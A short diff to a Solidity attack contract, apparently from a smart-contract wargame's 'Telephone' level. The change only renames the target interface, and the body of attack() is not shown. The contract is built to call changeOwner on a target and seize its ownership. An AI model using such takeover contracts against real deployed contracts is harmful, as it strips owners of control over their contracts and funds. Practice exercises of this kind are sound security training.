@@ -1,15 +1,15 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
-interface Telephone {
+interface TelephoneInterface {
     function changeOwner(address _owner) external;
 }
 
 contract AttackTelephone {
-    Telephone public telephone;
+    TelephoneInterface public telephone;
 
     constructor(address _telephone) {
-        telephone = Telephone(_telephone);
+        telephone = TelephoneInterface(_telephone);
     }
 
     function attack() public {
